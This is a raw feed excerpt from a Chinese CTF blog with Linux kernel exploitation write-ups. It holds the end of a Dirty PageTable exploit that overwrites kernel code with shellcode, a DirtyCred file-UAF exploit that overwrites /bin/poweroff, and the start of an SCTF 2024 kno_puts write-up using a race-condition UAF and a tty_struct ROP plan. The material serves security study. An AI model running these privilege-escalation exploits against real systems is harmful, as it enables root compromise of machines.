&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (evil == <span class="literal">NULL</span>) err_exit(<span class="string">&quot;target not found :(&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Place PTE entry for DMA buffer onto controllable PTE</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Remapping...&quot;</span>);</span><br><span class="line">    munmap(evil, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">void</span> *dmabuf = mmap(evil, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_SHARED | MAP_POPULATE, dma_buf_fd, <span class="number">0</span>);</span><br><span class="line">    *(<span class="type">char</span>*)dmabuf = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get physical AAR/AAW</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// Corrupt physical address of DMA-BUF</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DMA-BUF now points to PTE: 0x%016lx\n&quot;</span>, *(<span class="type">size_t</span>*)dmabuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Leak kernel physical base</span></span><br><span class="line">    <span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">            wwwbuf = page_spray[i];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> phys_base = ((*(<span class="type">size_t</span>*)wwwbuf) &amp; ~<span class="number">0xfff</span>) - <span class="number">0x3a01000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Physical kernel base address: 0x%016lx\n&quot;</span>, phys_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Overwrite setxattr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Overwriting getuid...&quot;</span>);</span><br><span class="line">    <span class="comment">// ffffffff811ab7e0 t __do_sys_getuid</span></span><br><span class="line">    <span class="type">size_t</span> phys_func = phys_base + <span class="number">0x1ab7e0</span> - <span class="number">0x3000</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = (phys_func &amp; ~<span class="number">0xfff</span>) | <span class="number">0x8000000000000067</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x11\x11\x11\x11\x11\x11\x11\x11&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = getpid();</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x22\x22\x22\x22\x22\x22\x22\x22&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = (<span class="type">size_t</span>)&amp;win;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x33\x33\x33\x33\x33\x33\x33\x33&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_cs;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x44\x44\x44\x44\x44\x44\x44\x44&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_rflags;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x55\x55\x55\x55\x55\x55\x55\x55&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_sp;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x66\x66\x66\x66\x66\x66\x66\x66&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(wwwbuf + (phys_func &amp; <span class="number">0xfff</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] GO!GO!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed...&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时打远程时的效果😋：</p><img src="/2024/11/12/fileuaf/15.png" class="" title="我的图图呢">  <h2 id="Dirty-Cred-in-file-uaf"><a href="#Dirty-Cred-in-file-uaf" class="headerlink" title="Dirty Cred in file uaf"></a>Dirty Cred in file uaf</h2><p>可以看到 Dirty PageTable 的功能非常的强大，能够让我们直接修改内核的代码段然后直接劫持程序流，打起来也非常的麻烦。如果我们的目标不是容器逃逸而是获取 flag 或者提权，我们完全有更加快的方法，那就是 DirtyCred。eeee 师傅之前给我发了一道内核题，笔者认为这是一个很好的 demo，下面给出题目的代码。  </p><h3 id="vuln-code"><a href="#vuln-code" class="headerlink" title="vuln code"></a>vuln code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vuln_ioctl</span><span class="params">(file *f, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">322420463</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !register_file )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    fput(register_file, cmd, arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-25LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">322428589</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( register_file )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-16LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        register_file = (file *)fget((<span class="type">unsigned</span> <span class="type">int</span>)arg);</span><br><span class="line">        <span class="keyword">if</span> ( register_file )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析与利用-1"><a href="#漏洞分析与利用-1" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>可以看到这个内核驱动是一个经典的菜单程序，他允许我们对文件描述符进行 fget 和 fput 两个操作。fget 会令 file-&gt;f_count 的值加一，fput 会令 file-&gt;f_count 的值减一。当 file 结构体的 f_count 的值为一时会被释放掉，而用户态依然有着对这个文件描述符的引用，所以这里存在一个白给的 file uaf 漏洞。<br>我们可以先用读写权限来打开一个普通用户具有读写权限的文件并将其作为将要 uaf 的文件，然后用 mmap 来映射我们将要 uaf 的文件:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dummy_fd = open(<span class="string">&quot;/tmp/sh&quot;</span>, O_RDWR | O_TRUNC | O_CREAT);</span><br><span class="line"><span class="keyword">if</span> (dummy_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;create&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fchmod(dummy_fd, <span class="number">0777</span>);</span><br><span class="line">close(dummy_fd);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> uaf_file = open(<span class="string">&quot;/tmp/sh&quot;</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(uaf_file &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;open low level file.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *data = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, uaf_file, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>然后多次调用 fput 将这个文件对应的 file-&gt;f_count 将其置为零使其被释放，但 mmap 仍然具有链接到该已释放块的打开的文件描述符。然后大量以只读权限来打开我们想要越权写的文件，确保我们之前的 uaf file 能够被重新使用，这里我选择喷射的文件为 &#x2F;bin&#x2F;poweroff。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Begin to spray file.&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x300</span>; i++)&#123;</span><br><span class="line">    spray_file[i] = open(<span class="string">&quot;/bin/poweroff&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (spray_file[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;spray file failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 mmap 是以写权限启动的，我们可以修改 mmap 指向的块的内容，尽管它最初具有只读访问权限，此时我们即可越权修改 &#x2F;bin&#x2F;poweroff 文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(data, elfcode, <span class="keyword">sizeof</span>(elfcode));</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="/2024/11/12/fileuaf/17.png" class="" title="我的图图呢">  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>呜呜呜，二进制真的太好玩了，可是能给我玩的时间不多了&#x2F;(ㄒoㄒ)&#x2F;~~</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MzU3Mjc3Ng==&mid=2247488477&idx=1&sn=f8531b3220ea3a9ca2a0fdc2fd9dabc6&chksm=ce77d59af9005c8c2ef35c7e45f45cbfc527bfc4b99bbd02dbaaa964d174a4009897dd329a4d&scene=178&cur_album_id=2559805446807928833#rd">一步一图带你构建 Linux 页表体系 —— 详解虚拟内存如何与物理内存进行映射 (qq.com)</a></p><p><a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFするぞ (hatenablog.com)</a></p><p><a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a></p><p><a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a></p><p><a href="https://www.52pojie.cn/thread-1849189-1-1.html">corCTF2022-corjail</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一题多解 SCTF 2024 kno_puts revenge</title>
      <link href="/2024/10/07/kno_puts/"/>
      <url>/2024/10/07/kno_puts/</url>
      
        <content type="html"><![CDATA[<h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><p>又有 kernel 啦  </p><img src="/2024/10/07/kno_puts/1.png" class="" title="我的图图呢">  <p>好久没看 <code>kernel</code> 了，刚好 <code>SCTF</code> 上就来了一道简单题。结果由于生疏了打的巨慢，连血都没拿到😭（4血）上图为比赛时打通的截图。</p><p>由于题目比较简单，所以我打算用多种打法来解决这道题目，同时也当作是对 <code>kernel</code> 的康复训练。这篇文章只是对题目进行各种攻击手段的分析，不会对每个内核结构体的结构以及攻击手法的具体原理进行详细的讲解。本篇文章我会逐步增加题目的限制，然后从低级到高级用不同的攻击手段对题目进行求解。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="关键代码："><a href="#关键代码：" class="headerlink" title="关键代码："></a>关键代码：</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_module_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-E0h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+60h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+94h] [rbp-7Ch] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+9Ch] [rbp-74h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+A4h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+ACh] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+B4h] [rbp-5Ch]</span></span><br><span class="line">  _QWORD v12[<span class="number">4</span>]; <span class="comment">// [rsp+B8h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+D8h] [rbp-38h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+E0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">32</span>]; <span class="comment">// [rsp+E8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  get_random_bytes(s2, <span class="number">32LL</span>);</span><br><span class="line">  check_object_size(v12, <span class="number">48LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v12, a3, <span class="number">48LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  printk(&amp;unk_837);</span><br><span class="line">  *(_QWORD *)s1 = v12[<span class="number">0</span>];</span><br><span class="line">  v8 = v12[<span class="number">1</span>];</span><br><span class="line">  v9 = v12[<span class="number">2</span>];</span><br><span class="line">  v10 = v12[<span class="number">3</span>];</span><br><span class="line">  LOBYTE(v11) = v13;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, s2, <span class="number">0x20</span>uLL) )</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-13LL</span>;</span><br><span class="line">  printk(&amp;unk_84D);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xFFF0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v14 || ptr )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    ptr = (<span class="type">void</span> *)_kmalloc(<span class="number">736LL</span>, <span class="number">3264LL</span>);</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">0x2E0</span>uLL);</span><br><span class="line">    printk(&amp;unk_768);</span><br><span class="line">    v6 = v14;</span><br><span class="line">    check_object_size(&amp;ptr, <span class="number">8LL</span>, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(v6, &amp;ptr, <span class="number">8LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0xFFF1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    v5 = ptr;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( fchoice )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr = <span class="number">0LL</span>;</span><br><span class="line">        kfree(v5);</span><br><span class="line">        fchoice = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">module_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_820);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">0x2E0</span> || !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  v5 = ptr;</span><br><span class="line">  check_object_size(ptr, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)copy_from_user(v5, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机数绕过"><a href="#随机数绕过" class="headerlink" title="随机数绕过"></a>随机数绕过</h3><p>可以看到题目会先生成一个 <code>32</code> 位的随机数然后和我们自己的字符串进行比较，要比较通过才可以进行后面的操作。这里听说有挺多种绕过方法，但由于这不是重点，所以这里我只用我自己的方法。我们可以赌随机数的第一位是 <code>\x00</code>，这个时候比较就会只比较第一位 <code>\x00</code>，写个循环爆破即可，我的 <code>add</code> 和 <code>del</code> 函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以发现这个内核驱动并没有上锁，所以我们可以利用条件竞争来创造出 <code>UAF</code>，即在 <code>write</code> 函数执行 <code>copy_from_user</code> 前调用 <code>kfree</code> 讲堆块释放掉，这个时候就会出现 <code>UAF</code></p><p>在进行堆块创建的时候，可以看见有一个 copy_to_user 函数被调用，我们可以利用这个来泄露出堆地址</p><h2 id="notes-leak-userfaultfd-tty-struct-rt-regs"><a href="#notes-leak-userfaultfd-tty-struct-rt-regs" class="headerlink" title="notes leak + userfaultfd + tty_struct + rt_regs"></a>notes leak + userfaultfd + tty_struct + rt_regs</h2><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>这是笔者我比赛时所使用的解法，同时也应该是最好想、最直接、最预期（我猜的）的解法。从一个内核初学者的角度来想，做 <code>kernel pwn</code> 肯定要先泄露内核地址，往往这并不简单，但这题的内核基址是白给的！！！具体原理可以参考我半年前的博客<a href="https://qanux.github.io/2024/04/17/notes/">When ELF notes reveal too much | Qanux’s space</a></p><img src="/2024/10/07/kno_puts/2.png" class="" title="我的图图呢">  <p>简单的来说，我们可以直接从 <code>/sys/kernel/notes</code> 中直接获取内核的地址。其次是堆地址，堆地址的获取方法已经写在题目分析部分了，这里不再进行讲述。</p><p>接下来我们关注到的是他的 <code>add</code> 操作是通过 <code>kmalloc</code> 申请了 <code>736</code> 字节的内存，这个大小刚好是 <code>tty_struct</code> 结构体的大小，这不是摆明着要我们通过劫持 <code>tty_struct</code> 的 <code>ops</code> 来实现程序流的控制？我们先来查看内核的版本</p><img src="/2024/10/07/kno_puts/3.png" class="" title="我的图图呢">  <p>可以发现内核的版本比较低，我们可以通过 <code>userfaultfd</code> 来将程序卡在 <code>copy_from_user</code>。接下来我们的目标就是在内核的某个位置写上 <code>kernel rop</code> 然后通过劫持 <code>tty_struct</code> 栈迁移到我们的 <code>kernel rop</code> 上去。其实这里可以直接将 <code>kernel rop</code> 写道 <code>tty_struct</code> 上然后进行两次栈迁移跳转到我们的 <code>rop</code> 上，可是我懒，完全没考虑要这么做😇</p><p>然后我幸运的发现，这个内核的 <code>pt_regs</code> 并没有开启随机化，也就是说当内核执行 <code>tty_struct</code> 虚表上的函数时该结构与 <code>rsp</code> 的距离不会变，所以我们可以直接将 <code>kernel rop</code> 布局到这个位置然后伪造 <code>tty_struct ops</code> 直接栈迁移到我们布局好的 <code>kernel rop</code> 上实现提权</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>由于比赛时比较紧张（想拿血），而且遇到了很多意外心态有点小崩，所以 <code>exp</code> 写的有点难看，可是不想改了 :-)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 